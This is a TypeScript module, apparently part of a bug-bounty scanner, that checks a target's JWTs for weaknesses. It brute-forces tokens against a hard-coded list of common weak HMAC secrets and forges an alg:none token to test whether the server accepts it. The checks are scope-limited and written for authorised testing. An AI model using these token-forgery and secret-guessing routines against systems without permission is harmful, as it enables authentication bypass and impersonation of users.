/* eslint-disable */
// JWT 脆弱性検出。
// httpTraffic の代わりに targetUrl のログインエンドポイントから JWT を取得して静的解析する。

import crypto from "node:crypto";
import { chromium } from "playwright";
import { isUrlInScope } from "@/lib/scope";
import { maskBody } from "@/lib/mask";
import { makeScanCtx, createScanFinding, findExistingScanFinding } from "@/lib/scan-adapter";

// よくある弱秘密鍵
const COMMON_JWT_SECRETS = [
  "secret", "Secret", "SECRET", "secretkey", "secret-key", "secret_key",
  "key", "Key", "KEY", "private", "privatekey", "private-key", "private_key",
  "your-256-bit-secret", "your-512-bit-secret", "your_jwt_secret",
  "jwt", "JWT", "jwtsecret", "jwt-secret", "jwt_secret",
  "password", "Password", "PASSWORD", "admin", "root",
  "1234", "12345", "123456", "1234567", "12345678", "123456789", "1234567890",
  "test", "TEST", "demo", "default", "changeme", "change-me", "change_me",
  "supersecret", "topsecret", "mysecret", "MYSECRET",
  "0", "00000000", "11111111",
  "qwerty", "asdf", "asdfasdf",
  "" // empty
];

function base64UrlDecode(input: string): string {
  const padded = input.replace(/-/g, "+").replace(/_/g, "/");
  const padding = padded.length % 4 === 0 ? "" : "=".repeat(4 - padded.length % 4);
  return Buffer.from(padded + padding, "base64").toString("utf8");
}

function base64UrlEncode(buf: Buffer | string): string {
  const b = typeof buf === "string" ? Buffer.from(buf) : buf;
  return b.toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

type JwtParts = { header: any; payload: any; signature: string; raw: string };

function decodeJwt(token: string): JwtParts | null {
  const parts = token.split(".");
  if (parts.length !== 3) return null;
  try {
    const header = JSON.parse(base64UrlDecode(parts[0]));
    const payload = JSON.parse(base64UrlDecode(parts[1]));
    return { header, payload, signature: parts[2], raw: token };
  } catch {
    return null;
  }
}

function verifyHs256(token: string, secret: string): boolean {
  const parts = token.split(".");
  if (parts.length !== 3) return false;
  const data = `${parts[0]}.${parts[1]}`;
  const expected = base64UrlEncode(crypto.createHmac("sha256", secret).update(data).digest());
  return expected === parts[2];
}

function tryWeakSecrets(token: string): string | null {
  for (const s of COMMON_JWT_SECRETS) {
    if (verifyHs256(token, s)) return s;
  }
  return null;
}

function buildAlgNoneToken(payload: any): string {
  const header = { alg: "none", typ: "JWT" };
  return `${base64UrlEncode(JSON.stringify(header))}.${base64UrlEncode(JSON.stringify(payload))}.`;
}

function extractJwtsFromResponseBody(body: string): string[] {
  const out: string[] = [];
  const matches = body.matchAll(/"(?:access_token|token|jwt|id_token|accessToken|idToken)"\s*:\s*"(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)"/g);
  for (const m of matches) {
    out.push(m[1]);
  }
  // Also check Authorization header patterns in body
  const m2 = body.match(/Bearer\s+(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)/g);
  if (m2) {
    for (const match of m2) {
      const tok = match.replace("Bearer ", "");
      if (!out.includes(tok)) out.push(tok);
    }
  }
  return out.slice(0, 5);
}

async function fetchJwtFromEndpoint(url: string): Promise<string[]> {
  const browser = await chromium.launch({ headless: true });
  try {
    const context = await browser.newContext({ ignoreHTTPSErrors: true });
    const page = await context.newPage();
    const res = await page.request.fetch(url, { method: "GET", failOnStatusCode: false, timeout: 10000 });
    const body = await res.text().catch(() => "");
    await context.close();
    return extractJwtsFromResponseBody(body);
  } finally {
    await browser.close();
  }
}

async function fetchWithBearer(url: string, token: string): Promise<{ status: number; body: string }> {
  const browser = await chromium.launch({ headless: true });
  try {
    const context = await browser.newContext({ ignoreHTTPSErrors: true });
    const page = await context.newPage();
    const res = await page.request.fetch(url, {
      method: "GET",
      headers: { Authorization: `Bearer ${token}` },
      failOnStatusCode: false,
      timeout: 10000
    });
    const body = await res.text().catch(() => "");
    await context.close();
    return { status: res.status(), body: body.slice(0, 4000) };
  } finally {
    await browser.close();
  }
}

export async function runJwtVulnsCheck(scanId: string, targetUrl: string) {
  const program = makeScanCtx(scanId, targetUrl);
  const base = new URL(targetUrl).origin;

  // Try to find JWT tokens from common endpoints
  const candidateEndpoints = [
    `${base}/.well-known/jwks.json`,
    `${base}/api/auth/token`,
    `${base}/api/token`,
    `${base}/auth/token`,
    `${base}/oauth/token`,
    `${base}/api/me`,
    `${base}/api/user`
  ].filter((u) => isUrlInScope(program, u).allowed);

  const seenTokens = new Set<string>();
  const candidateTokens: { token: string; sampleUrl: string }[] = [];

  for (const ep of candidateEndpoints.slice(0, 5)) {
    try {
      const tokens = await fetchJwtFromEndpoint(ep);
      for (const tok of tokens) {
        if (seenTokens.has(tok)) continue;
        seenTokens.add(tok);
        candidateTokens.push({ token: tok, sampleUrl: ep });
        if (candidateTokens.length >= 8) break;
      }
    } catch { /* skip */ }
    if (candidateTokens.length >= 8) break;
  }

  let count = 0;
  for (const cand of candidateTokens) {
    if (count >= 5) break;
    const decoded = decodeJwt(cand.token);
    if (!decoded) continue;
    const issues: string[] = [];
    let severity: "critical" | "high" | "medium" | "low" = "low";
    let exploitDetail = "";

    // a) alg: none
    if (typeof decoded.header?.alg === "string" && decoded.header.alg.toLowerCase() === "none") {
      issues.push("alg: none で署名検証を回避できる ( トークン自体が none で発行されている )");
      severity = "critical";
    }
    // b) weak secret ( HS256 限定 )
    if (typeof decoded.header?.alg === "string" && /^HS(256|384|512)$/i.test(decoded.header.alg)) {
      const secret = tryWeakSecrets(cand.token);
      if (secret !== null) {
        issues.push(`HS256 弱い秘密鍵 "${secret || "(空文字)"}" で署名が検証できる`);
        exploitDetail = `secret="${secret}"`;
        severity = "critical";
      }
    }
    // c) algorithm confusion (RS256)
    if (typeof decoded.header?.alg === "string" && /^RS(256|384|512)$/i.test(decoded.header.alg)) {
      issues.push("RS256 を使用 ( algorithm confusion 攻撃 RS256→HS256 の余地あり、public key が取得できれば検証可能 )");
      if (severity === "low") severity = "medium";
    }
    // d) exp なし or 異常に長い
    if (decoded.payload && typeof decoded.payload === "object") {
      if (decoded.payload.exp === undefined) {
        issues.push("exp ( 有効期限 ) クレームが未設定 ( トークンが永久に有効 )");
        if (severity === "low") severity = "medium";
      } else if (typeof decoded.payload.exp === "number") {
        const expSec = decoded.payload.exp;
        const iatSec = decoded.payload.iat ?? Math.floor(Date.now() / 1000);
        const validitySec = expSec - iatSec;
        if (validitySec > 365 * 24 * 3600) {
          issues.push(`有効期限が異常に長い ( ${Math.round(validitySec / 86400)} 日 )`);
          if (severity === "low") severity = "medium";
        }
      }
      const sensitiveKeys = ["password", "api_key", "apikey", "secret", "private_key", "credit_card"];
      for (const k of Object.keys(decoded.payload)) {
        if (sensitiveKeys.includes(k.toLowerCase())) {
          issues.push(`payload に機微情報クレーム "${k}" が含まれる ( JWT は base64 だけで誰でも復号可能 )`);
          if (severity === "low") severity = "medium";
        }
      }
    }
    if (issues.length === 0) continue;

    // Dynamic verification for alg:none
    let dynamicVerified = false;
    let dynamicEvidence = "";
    if (severity === "critical" && decoded.payload && isUrlInScope(program, cand.sampleUrl).allowed) {
      try {
        const algNoneTok = buildAlgNoneToken(decoded.payload);
        const baseline = await fetchWithBearer(cand.sampleUrl, cand.token);
        const probe = await fetchWithBearer(cand.sampleUrl, algNoneTok);
        if (baseline.status >= 200 && baseline.status < 300 && probe.status >= 200 && probe.status < 300) {
          dynamicVerified = true;
          dynamicEvidence = `baseline status=${baseline.status}, alg-none probe status=${probe.status} ( 同じく成功レスポンス → サーバが alg:none を受け入れている疑い )`;
        } else {
          dynamicEvidence = `baseline status=${baseline.status}, alg-none probe status=${probe.status} ( probe が 4xx/5xx に変わったため alg:none は拒否されている )`;
        }
      } catch (e) {
        dynamicEvidence = `動的検証失敗: ${e instanceof Error ? e.message : e}`;
      }
    }

    const sev: string = severity;
    const sevLabel = sev === "critical" ? "Critical" : sev === "high" ? "High" : sev === "medium" ? "Medium" : "Low";
    const tokenSnippet = `${cand.token.slice(0, 12)}...${cand.token.slice(-8)}`;
    const taggedType = `JWT 脆弱性候補 (${issues[0].split("(")[0].trim()}) [${sevLabel}]`;
    const target = `Bearer ${tokenSnippet} (sampleUrl ${cand.sampleUrl.slice(0, 60)})`;
    const existing = await findExistingScanFinding(scanId, taggedType, target);
    if (existing) continue;
    await createScanFinding(scanId, {
      type: taggedType,
      target,
      severity,
      impact: `httpTraffic から抽出した JWT ( header.alg=${decoded.header?.alg}, payload keys: ${Object.keys(decoded.payload ?? {}).join(", ")} ) に以下の問題が確認されました: ${issues.join(" / ")}。攻撃者は署名を偽造して任意のユーザーになりすましたり、トークンを永続的に再利用したり、機微情報を読み取ることができます。${dynamicVerified ? " 動的検証で alg:none が受け入れられることも確認しました。" : ""}`,
      inScopeReason: `収集済み許可ドメイン経由で取得された JWT トークン`,
      evidence: `tokenSnippet=${tokenSnippet}, alg=${decoded.header?.alg}, issues=${issues.length}${exploitDetail ? `, exploit=${exploitDetail}` : ""}${dynamicVerified ? ", dynamicVerified=true" : ""}`,
      requestResponseDiff: maskBody("application/json", JSON.stringify({
        headerDecoded: decoded.header,
        payloadDecodedKeys: Object.keys(decoded.payload ?? {}),
        issues,
        exploitDetail,
        dynamicEvidence,
        safetyNote: "JWT decode は base64 のみで実行可能 (誰でも見れる情報)。weak secret 試行は HMAC 計算のみでサーバ側に追加リクエストは送っていない。動的検証は実施した場合のみ in-scope GET エンドポイントで baseline+probe の 2 回のみ。"
      }, null, 2)),
      reproductionSteps: `1. ${cand.sampleUrl} へのリクエストの Authorization: Bearer ヘッダーから JWT を取得\n2. 各部を base64 decode して header.alg と payload を確認\n3. ${issues.join("\n   - ")}\n${dynamicVerified ? `4. alg:none 改ざんトークンを送り、サーバが ${dynamicEvidence}` : "4. PoC: JWT を改ざんして送り、サーバが受け入れるか実環境検証してください"}`,
      aiWorthSending: sev === "critical" ? "Critical: 即座に認証バイパス成立。dynamic verified の場合は PoC 完成 → 報告候補。" : sev === "medium" ? "Medium: 単独では弱いが組み合わせ ( SSO 中継等 ) で High に化ける可能性。" : "情報開示寄り。コンテキスト確認後に報告判断。",
      bountyLikelihood: sev === "critical" ? "very_high" : sev === "high" ? "high" : "medium",
      recommendedAction: sev === "critical" ? "report_now" : "manual_verify"
    });
    count++;
  }
  return count;
}
